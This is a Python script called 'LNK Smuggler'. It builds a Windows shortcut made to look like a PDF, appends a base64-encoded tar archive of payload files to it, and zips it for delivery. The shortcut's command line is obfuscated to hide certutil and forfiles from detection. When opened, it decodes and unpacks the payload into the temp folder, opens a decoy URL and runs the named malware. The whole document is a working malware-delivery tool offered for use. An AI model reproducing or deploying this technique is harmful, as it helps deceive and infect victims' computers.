import tarfile
import base64
import os
import sys
from zipfile import ZipFile
import pyfiglet
from win32com.client import Dispatch

marker = 1

def create_shortcut(lnk_name,decoy_url,malware):
    global marker
    try:
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortcut(lnk_name)
        shortcut.TargetPath = "C:\\windows\\system32\\cmd.exe"
        #Not delivered via ZIP, i.e. plain LNK file in IMG/ISO(?).
        #shortcut.Arguments = f' /c more {lnk_name} +{marker} > %temp%\\setup.b64 & certutil -decodehex %temp%\\setup.b64 %temp%\\setup.tar 1 & tar -xf %temp%\\setup.tar -C %temp% & start iexplore {decoy_url} & %temp%\\{malware}'
        #Delivered via ZIP and since forfiles is used we need some obfuscation.
        shortcut.Arguments = f' /V /c set w=l & set o=rt & set p=files & more {lnk_name} +{marker} > %temp%\\setup.b64 & for!p! /s /p %temp% /m *{lnk_name}* /C "cmd /c more +{marker} @file > %temp%\\setup.b64" & certuti!w! -decodehex %temp%\\setup.b64 %temp%\\setup.tar 1 & tar -xf %temp%\\setup.tar -C %temp% & sta!o! iexplore {decoy_url} & %temp%\\{malware}'
        shortcut.WindowStyle = 7  # Run minimized
        shortcut.IconLocation = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe,11" # PDF icon
        shortcut.save()
    except Exception as e:
        print(f"[-] Error creating shortcut: {e}")

def create_lnk_with_append(lnk_name, decoy_url, files):
    # Ensure the lnk file name ends with .lnk
    if not lnk_name.endswith('.lnk'):
        lnk_name += '.lnk'

    # Create the shortcut
    create_shortcut(lnk_name, decoy_url,files[0])

    # Create a tarball of the files
    tarball_name = "temp_files.tar"
    with tarfile.open(tarball_name, "w") as tar:
        for file in files:
            if os.path.exists(file):
                tar.add(file, arcname=os.path.basename(file))
            else:
                print(f"[-] Warning: File '{file}' does not exist and will be skipped.")

    # Read the tarball and encode it in Base64
    with open(tarball_name, "rb") as tar:
        tar_data = tar.read()
    tar_base64 = base64.b64encode(tar_data).decode('utf-8')

    # Append the encoded data to the shortcut file
    try:
        with open(lnk_name, "ab") as lnk_file:
            lnk_file.write(b"\nSTARTOFAPPEND\n")
            #start_of_append_line = None

            with open(lnk_name, "rb") as lnk_read_file:
                lines = lnk_read_file.readlines()
                #start_of_append_line = len(lines)
                
            lnk_file.write(tar_base64.encode('utf-8'))

        #print(f"Data appended to '{lnk_name}' successfully.")
    except Exception as e:
        print(f"[-] Error appending data to .lnk file: {e}")
    finally:
        # Clean up the temporary tarball
        if os.path.exists(tarball_name):
            os.remove(tarball_name)


def find_string_in_file(file_path, search_str):
    try:
        global marker
        with open(file_path, 'rb') as file:  # Open in binary mode to handle null bytes
            line_num = 1  # Start from line 1
            found = False
            content = file.read()  # Read the entire content as bytes

            # Split content by both null bytes (0x00) and newline (0x0A or 0x0D)
            # Regular expressions to split by both \0 and \n characters
            import re
            lines = re.split(b'[\x00\x0A]', content)  # Split by null byte (\0) and newline (\n)

            for line in lines:
                # Decode the line to a string, ignoring any invalid characters
                decoded_line = line.decode('utf-8', errors='ignore')

                # If the search string is in the line, print the line number and the line
                if search_str in decoded_line:
                    marker = line_num
                    found = True
                    break #we are suppose to have the marker only once

                line_num += 1  # Increment line number
                
            if not found:
                print(f'"{search_str}" not found in {file_path}')

    except FileNotFoundError:
        print(f"Error: The file '{file_path}' does not exist.")
    except Exception as e:
        print(f"Error: {e}")


if __name__ == "__main__":
    ascii_banner = pyfiglet.figlet_format("LNK Smuggler")
    print(ascii_banner)
    if len(sys.argv) < 4:
        print("Usage: python script.py <lnk_name> <decoy_url> <file1> <file2> ...")
        sys.exit(1)
    #global marker
    lnk_name = sys.argv[1]
    decoy_url = sys.argv[2]
    files = sys.argv[3:]
    # We need to create it 3 times since every time we change the file the marker changes...
    create_lnk_with_append(lnk_name, decoy_url, files)
    find_string_in_file(lnk_name,"STARTOFAPPEND")
    create_lnk_with_append(lnk_name, decoy_url, files)
    find_string_in_file(lnk_name,"STARTOFAPPEND")
    create_lnk_with_append(lnk_name, decoy_url, files)
    print(f"[+] The marker is on line {marker}")
    print(f"[+] Shortcut '{lnk_name}' created successfully!")
    # Create a ZipFile Object
    with ZipFile(lnk_name.split('.')[0] + ".zip", 'w') as zip_object:
       zip_object.write(lnk_name)
    if os.path.exists(lnk_name.split('.')[0] + ".zip"):
        print(f"[+] ZIP file '{lnk_name.split('.')[0]}.zip' created successfully. Enjoy!")
    else:
        print("ZIP file not created")
    